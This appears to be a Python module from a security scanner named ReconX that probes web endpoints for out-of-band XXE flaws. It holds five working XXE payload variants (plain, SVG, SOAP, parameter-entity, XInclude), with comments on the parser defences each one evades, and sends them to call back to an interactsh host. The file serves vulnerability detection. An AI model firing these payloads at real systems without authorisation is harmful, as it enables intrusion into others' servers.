"""
ReconX - Module: OOB XXE indicators.
"""

import json
import time
from urllib.parse import urlparse

import requests

from modules.base import BaseModule
from modules.vulnscan import VulnScanModule


# Path/query tokens that suggest a server-side XML parser is in play.
# Sourced from PayloadsAllTheThings/XXE Injection plus common Office/SOAP/SAML routes.
XML_HINTS = (
    ".xml", "/xml", "xmlrpc",
    "soap", "wsdl", "saml", "sso",
    "upload", "import", "export", "parse",
    ".docx", ".xlsx", ".pptx", ".odt", ".svg",
    "rss", "atom", "feed", "rest/xml",
    "wp-content", "axis2", "openidp",
)


def _xxe_payload_variants(payload_url: str) -> list[tuple[str, str, str]]:
    """Return a catalogue of (variant_name, content_type, body) XXE payloads.

    Each variant targets a different parser context: standard XML, SVG image,
    SOAP envelope, Office XML, and parameter-entity DTD chaining. The detector
    fires on whichever variant triggers an OOB callback.
    """
    return [
        (
            "standard_external_entity",
            "application/xml",
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE reconx [ <!ENTITY xxe SYSTEM "' + payload_url + '"> ]>\n'
            "<reconx>&xxe;</reconx>",
        ),
        (
            "svg_external_entity",
            "image/svg+xml",
            '<?xml version="1.0" standalone="no"?>\n'
            '<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "' + payload_url + '"> ]>\n'
            '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
        ),
        (
            "soap_envelope_xxe",
            "text/xml; charset=utf-8",
            '<?xml version="1.0" encoding="utf-8"?>\n'
            '<!DOCTYPE soap:Envelope [ <!ENTITY xxe SYSTEM "' + payload_url + '"> ]>\n'
            '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
            "<soap:Body><reconx>&xxe;</reconx></soap:Body>"
            "</soap:Envelope>",
        ),
        (
            "parameter_entity_dtd_chain",
            "application/xml",
            # Parameter entities are evaluated inside the DTD itself, which bypasses
            # parsers that block direct &xxe; expansion in the document body.
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE reconx [\n'
            ' <!ENTITY % param SYSTEM "' + payload_url + '?dtd">\n'
            ' %param;\n'
            "]>\n"
            "<reconx>reconx</reconx>",
        ),
        (
            "xinclude_external",
            "application/xml",
            # XInclude bypasses parsers that disable the DOCTYPE declaration.
            '<?xml version="1.0"?>\n'
            '<reconx xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include href="' + payload_url + '" parse="text"/>'
            "</reconx>",
        ),
    ]


class XXEProbeModule(BaseModule):
    name = "xxe_probe"
    description = "OOB XXE Detection"
    required_tools: list[str] = []

    def __init__(
        self,
        target: str,
        output_dir: str,
        config: dict,
        fuzzer_results: dict | None = None,
        openapi_results: dict | None = None,
        live_hosts: list | None = None,
    ):
        super().__init__(target, output_dir, config)
        self.fuzzer_results = fuzzer_results or {}
        self.openapi_results = openapi_results or {}
        self.live_hosts = live_hosts or []
        self._oob_process = None

    def run(self) -> dict:
        cfg = self.config.get("scan", {}).get("xxe_probe", {})
        if not cfg.get("enabled", True):
            return {"findings": [], "total": 0, "status": "disabled"}

        targets = self._targets()[: int(cfg.get("max_targets", 40))]
        if not targets:
            self.warn("No XML-like targets for XXE checks")
            return {"findings": [], "total": 0, "targets": []}

        runtime = self._start_oob_runtime(cfg)
        callback = str(runtime.get("callback_url", "")).strip()
        if not callback:
            self._stop_oob_client(runtime)
            return {"findings": [], "total": 0, "targets": targets, "reason": "oob_unavailable"}

        sent: list[dict] = []
        session = requests.Session()
        session.verify = False
        try:
            for idx, url in enumerate(targets):
                # Each target gets a unique token + the full variant catalogue.
                # The variant whose parser context the server actually accepts is
                # the one that will produce an OOB callback; the rest are harmless.
                token = f"xxe{idx:04d}"
                payload_url = self._oob_payload(callback, token)
                for variant_name, content_type, body in _xxe_payload_variants(payload_url):
                    resp = self.http_request(
                        "POST", url, session=session, safe_readonly=True,
                        headers={"Content-Type": content_type},
                        data=body,
                        timeout=float(cfg.get("timeout", 10)), verify=False,
                    )
                    sent.append({
                        "token": token,
                        "url": url,
                        "variant": variant_name,
                        "content_type": content_type,
                        "payload_url": payload_url,
                        "status": getattr(resp, "status_code", None),
                    })

            wait = float(cfg.get("oob_wait", runtime.get("cooldown_period", 5)))
            if wait > 0:
                time.sleep(wait)
            interactions = self._read_oob_interactions(runtime)
            findings = []
            seen_tokens: set[str] = set()
            for item in sent:
                if item["token"] in seen_tokens:
                    continue
                matches = self._matching_interactions(interactions, item["token"])
                if matches:
                    seen_tokens.add(item["token"])
                    findings.append(self._finding("xxe_oob_callback", "HIGH", item["url"], "XXE confirmed by OOB callback", {
                        **item,
                        "interactions": matches[:5],
                    }))
            self.save_json(findings, "xxe_findings.json")
            self.save_json(sent, "xxe_probes.json")
            return {"findings": findings, "total": len(findings), "targets": targets}
        finally:
            self._stop_oob_client(runtime)

    def _targets(self) -> list[str]:
        candidates: set[str] = set()
        classified = self.fuzzer_results.get("classified", {}) or {}
        for key in ("api", "with_params"):
            candidates.update(str(url) for url in classified.get(key, []) or [])
        for endpoint in self.openapi_results.get("endpoints", []) or []:
            if isinstance(endpoint, dict) and endpoint.get("url"):
                candidates.add(endpoint["url"])
        for item in self.live_hosts:
            url = item.get("url", "") if isinstance(item, dict) else str(item)
            if url.startswith(("http://", "https://")):
                candidates.add(url)
        filtered = [
            url for url in candidates
            if any(hint in (urlparse(url).path + "?" + urlparse(url).query).lower() for hint in XML_HINTS)
        ]
        return self.filter_in_scope_urls(filtered)

    def _start_oob_runtime(self, cfg: dict) -> dict:
        oob_cfg = dict(self.config.get("scan", {}).get("nuclei", {}).get("oob", {}) or {})
        oob_cfg.update(cfg.get("oob", {}) or {})
        return VulnScanModule._apply_oob_flags(self, [], {"oob": oob_cfg})

    def _start_interactsh_client(self, oob_cfg: dict) -> dict:
        return VulnScanModule._start_interactsh_client(self, oob_cfg)

    def _read_interactsh_callback(self, proc, timeout: float = 10) -> str:
        return VulnScanModule._read_interactsh_callback(self, proc, timeout)

    def _stop_oob_client(self, runtime: dict) -> None:
        VulnScanModule._stop_oob_client(self, runtime)

    _extract_interactsh_callback = staticmethod(VulnScanModule._extract_interactsh_callback)
    _server_from_callback = staticmethod(VulnScanModule._server_from_callback)

    def _read_oob_interactions(self, runtime: dict) -> list[dict]:
        rel_path = runtime.get("interactions_log", "")
        path = self.output_dir / rel_path if rel_path else self.module_dir / "interactsh_interactions.jsonl"
        if not path.exists():
            return []
        result = []
        for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
            try:
                result.append(json.loads(line))
            except json.JSONDecodeError:
                result.append({"raw": line})
        return result

    @staticmethod
    def _oob_payload(callback: str, token: str) -> str:
        host = callback
        if "://" in host:
            host = urlparse(host).hostname or host
        host = host.split("/", 1)[0].strip(".")
        return f"http://{token}.{host}/xxe"

    @staticmethod
    def _xml_payload(payload_url: str) -> str:
        return (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE reconx [ <!ENTITY xxe SYSTEM "' + payload_url + '"> ]>\n'
            "<reconx>&xxe;</reconx>"
        )

    @staticmethod
    def _matching_interactions(interactions: list[dict], token: str) -> list[dict]:
        return [item for item in interactions if token.lower() in json.dumps(item, default=str).lower()]

    def _finding(self, finding_id: str, severity: str, url: str, title: str, evidence: dict) -> dict:
        return {
            "source": self.name,
            "id": finding_id,
            "type": finding_id,
            "name": title,
            "title": title,
            "severity": severity,
            "url": url,
            "matched_url": url,
            "description": "An XML parser resolved an external entity and triggered an OOB callback.",
            "evidence": evidence,
            "references": ["https://portswigger.net/web-security/xxe"],
            "confidence": 0.95,
        }
